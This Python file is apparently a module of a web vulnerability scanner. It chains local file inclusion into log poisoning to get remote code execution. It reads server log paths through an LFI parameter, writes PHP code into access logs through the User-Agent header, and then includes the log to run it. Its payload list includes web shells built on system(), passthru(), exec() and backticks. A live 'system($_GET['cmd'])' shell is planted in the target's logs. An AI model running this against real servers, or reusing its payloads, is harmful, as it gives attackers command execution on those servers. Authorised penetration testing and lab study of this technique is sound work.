"""Log Poisoning RCE Scanner

LFI → 日志污染 → RCE 检测链
"""
import asyncio
import re
import time
import random
import string
import hashlib
from urllib.parse import quote
from typing import Dict, List, Tuple
from dataclasses import dataclass
import aiohttp


@dataclass
class LogPoisonResult:
    lfi_url: str
    lfi_param: str
    log_path: str
    payload_type: str
    rce_confirmed: bool
    response_evidence: str
    severity: str = "critical"
    confidence: float = 0.0
    poc: str = ""


LOG_PATHS = [
    ("../../../var/log/apache2/access.log", "apache_access", "Apache access log"),
    ("../../../var/log/apache2/error.log", "apache_error", "Apache error log"),
    ("../../../../var/log/apache2/access.log", "apache_access", "Apache access log (4 levels)"),
    ("../../../../var/log/apache2/error.log", "apache_error", "Apache error log (4 levels)"),
    ("/var/log/apache2/access.log", "apache_access", "Apache access log (absolute)"),
    ("/var/log/apache2/error.log", "apache_error", "Apache error log (absolute)"),
    ("/var/log/httpd/access_log", "apache_access", "Apache access_log (RHEL)"),
    ("/var/log/httpd/error_log", "apache_error", "Apache error_log (RHEL)"),
    ("../../../var/log/nginx/access.log", "nginx_access", "Nginx access log"),
    ("../../../var/log/nginx/error.log", "nginx_error", "Nginx error log"),
    ("../../../../var/log/nginx/access.log", "nginx_access", "Nginx access log (4 levels)"),
    ("../../../../var/log/nginx/error.log", "nginx_error", "Nginx error log (4 levels)"),
    ("/var/log/nginx/access.log", "nginx_access", "Nginx access log (absolute)"),
    ("/var/log/nginx/error.log", "nginx_error", "Nginx error log (absolute)"),
    ("../../../var/log/auth.log", "ssh_auth", "SSH auth log (debian/ubuntu)"),
    ("../../../../var/log/auth.log", "ssh_auth", "SSH auth log (4 levels)"),
    ("/var/log/auth.log", "ssh_auth", "SSH auth log (absolute)"),
    ("../../../var/log/secure", "ssh_auth", "SSH auth log (RHEL/CentOS)"),
    ("../../../../var/log/secure", "ssh_auth", "SSH auth log secure (4 levels)"),
    ("../../../var/log/mail.log", "mail", "Mail log"),
    ("../../../var/log/syslog", "syslog", "Syslog"),
    ("../../../var/log/messages", "messages", "Messages (RHEL)"),
    ("../../../var/log/lighttpd/access.log", "lighttpd_access", "Lighttpd access log"),
    ("../../../var/log/lighttpd/error.log", "lighttpd_error", "Lighttpd error log"),
]

LFI_FILE_SIGNATURES = {
    "passwd": re.compile(r"root:.*?:/root:/bin/(?:ba)?sh", re.IGNORECASE),
    "apache_access": re.compile(r'\d+\.\d+\.\d+\.\d+\s+-\s+-\s+\[[\d/]+:[\d:]+\s+[+-]\d{4}\]', re.IGNORECASE),
    "apache_error": re.compile(r'\[(Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s+\w+\s+\d+', re.IGNORECASE),
    "nginx_access": re.compile(r'\d+\.\d+\.\d+\.\d+\s+-\s+-\s+\[[\d/]+:[\d:]+\s+[+-]\d{4}\]', re.IGNORECASE),
    "auth_log": re.compile(r'(sshd|pam|systemd)\[', re.IGNORECASE),
    "syslog": re.compile(r'^\w{3}\s+\d+\s+[\d:]+', re.IGNORECASE),
    "mail": re.compile(r'(mail|postfix|sendmail)\[', re.IGNORECASE),
}

PHP_PAYLOADS = [
    ("<?php echo md5('WVS_TEST'); ?>", "echo_md5", "基础回显"),
    ("<?php system($_GET['cmd']); ?>", "system_cmd", "system() cmd 参数"),
    ("<?php echo `{$_GET['wvs']}`; ?>", "backtick_cmd", "反引号命令执行"),
    ("<?php passthru($_GET['c']); ?>", "passthru_cmd", "passthru() cmd"),
    ("<?php exec($_GET['e']); ?>", "exec_cmd", "exec() cmd"),
    ("<?php $c=$_GET['x']; `$c`; ?>", "backtick_var", "变量命令执行"),
    ("<?php @assert($_GET['a']); ?>", "assert_eval", "assert() eval"),
    ("<?=`$_GET['q']`?>", "short_tag_backtick", "短标签+反引号"),
    ("<?php include($_GET['f']); ?>", "include_lfi", "include() 文件包含"),
]

RCE_SIGNATURES = [
    (r"5d41402abc4b2a76b9719d911017c592", "md5('WVS_TEST')"),
    (r"uid=\d+", "id command"),
    (r"root|www-data|daemon", "user identity"),
    (r"bin/(ba)?sh", "shell available"),
    (r"Linux.*?#\d+", "linux kernel version"),
]


def _gen_unique_marker() -> str:
    return "WVS_" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))


class LogPoisonScanner:
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.delay = self.config.get("delay", 0.3)
        self.verify_ssl = self.config.get("verify_ssl", False)
        self.max_log_paths = self.config.get("max_log_paths", 8)

    async def _send(self, session: aiohttp.ClientSession,
                   method: str, url: str, **kwargs) -> Tuple[int, str, float]:
        start = time.time()
        try:
            async with session.request(method, url, **kwargs) as resp:
                content = await resp.text()
                return resp.status, content, time.time() - start
        except Exception as e:
            return 0, str(e), time.time() - start

    async def _test_lfi_readable(self, session: aiohttp.ClientSession,
                                  base_url: str, param: str,
                                  log_path: str) -> Tuple[bool, str]:
        test_url = f"{base_url}?{param}={quote(log_path)}"
        status, content, _ = await self._send(session, "GET", test_url)
        if status == 200 and len(content) > 100:
            for sig_name, sig_re in LFI_FILE_SIGNATURES.items():
                if sig_re.search(content):
                    return True, sig_name
        return False, ""

    async def _poison_via_user_agent(self, session: aiohttp.ClientSession,
                                      base_url: str, payload: str) -> bool:
        try:
            headers = {"User-Agent": payload}
            async with session.get(base_url, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=5)) as resp:
                return resp.status < 500
        except:
            return False

    async def scan(self, base_url: str, lfi_param: str = "page",
                   log_paths: List[Tuple[str, str, str]] = None) -> List[LogPoisonResult]:
        log_paths = log_paths or LOG_PATHS[:self.max_log_paths]
        results = []

        connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
        timeout = aiohttp.ClientTimeout(total=self.timeout)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Step 1: 扫描可读的日志文件
            usable = []
            for lp, ltype, ldesc in log_paths:
                ok, sig = await self._test_lfi_readable(session, base_url, lfi_param, lp)
                await asyncio.sleep(self.delay)
                if ok:
                    usable.append((lp, ltype, sig))
                    print(f"    [+] LFI readable: {lp} ({sig})")

            if not usable:
                return []

            # Step 2: 生成唯一标记
            marker = _gen_unique_marker()
            md5_marker = hashlib.md5(marker.encode()).hexdigest()
            poison_payload = f"<?php echo md5('{marker}'); ?>"

            print(f"    [*] Poisoning logs with marker: {marker}")

            # Step 3: 写入 + 触发
            for lp, ltype, sig in usable:
                if ltype not in ("apache_access", "nginx_access", "lighttpd_access"):
                    continue

                ok = await self._poison_via_user_agent(session, base_url, poison_payload)
                await asyncio.sleep(self.delay)
                if not ok:
                    continue

                # 触发 RCE
                test_url = f"{base_url}?{lfi_param}={quote(lp)}"
                status, response, duration = await self._send(session, "GET", test_url)
                await asyncio.sleep(self.delay)

                if md5_marker in response:
                    results.append(LogPoisonResult(
                        lfi_url=base_url,
                        lfi_param=lfi_param,
                        log_path=lp,
                        payload_type="php_code",
                        rce_confirmed=True,
                        response_evidence=response[:300],
                        severity="critical",
                        confidence=0.95,
                        poc=test_url
                    ))
                    break

            # Step 4: 尝试 system(cmd) 模式
            if not results:
                system_payload = "<?php system($_GET['cmd']);?>"
                marker_cmd = f"echo {marker}"

                for lp, ltype, sig in usable:
                    if ltype not in ("apache_access", "nginx_access", "lighttpd_access"):
                        continue

                    ok = await self._poison_via_user_agent(session, base_url, system_payload)
                    await asyncio.sleep(self.delay)
                    if not ok:
                        continue

                    test_url = f"{base_url}?{lfi_param}={quote(lp)}&cmd={quote(marker_cmd)}"
                    status, response, duration = await self._send(session, "GET", test_url)
                    await asyncio.sleep(self.delay)

                    for sig_re, sig_desc in RCE_SIGNATURES:
                        if re.search(sig_re, response):
                            results.append(LogPoisonResult(
                                lfi_url=base_url,
                                lfi_param=lfi_param,
                                log_path=lp,
                                payload_type="reverse_shell",
                                rce_confirmed=True,
                                response_evidence=response[:300],
                                severity="critical",
                                confidence=0.95,
                                poc=test_url
                            ))
                            break

                if results:
                    break

        return results


# ============ 单元测试 ============
async def _test_unit():
    m1 = _gen_unique_marker()
    m2 = _gen_unique_marker()
    assert m1.startswith("WVS_") and len(m1) == 10
    assert m1 != m2
    print(f"  [OK] _gen_unique_marker: {m1}, {m2}")

    scanner = LogPoisonScanner()
    assert scanner.timeout == 10
    assert scanner.max_log_paths == 8
    print(f"  [OK] LogPoisonScanner init")

    scanner2 = LogPoisonScanner({"timeout": 20, "max_log_paths": 5})
    assert scanner2.timeout == 20
    assert scanner2.max_log_paths == 5
    print(f"  [OK] LogPoisonScanner config")

    assert len(PHP_PAYLOADS) >= 9
    print(f"  [OK] PHP_PAYLOADS count: {len(PHP_PAYLOADS)}")
    assert len(LOG_PATHS) >= 15
    print(f"  [OK] LOG_PATHS count: {len(LOG_PATHS)}")

    url = "http://target.com/view.php?page=test"
    base = url.split('?')[0]
    assert base == "http://target.com/view.php"
    print(f"  [OK] URL parsing: {url} -> {base}")

    print("\n[OK] All unit tests PASSED")
    return True


async def _test_integration():
    scanner = LogPoisonScanner({"timeout": 8, "delay": 0.2})
    results = await scanner.scan("http://192.168.18.131/mutillidae/index.php", lfi_param="page")
    print(f"  [OK] Integration scan: {len(results)} results")


async def main():
    ok = await _test_unit()
    try:
        await _test_integration()
    except Exception as e:
        print(f"  [!] Integration test skipped: {e}")
    return ok


if __name__ == "__main__":
    import sys
    ok = asyncio.run(main())
    sys.exit(0 if ok else 1)
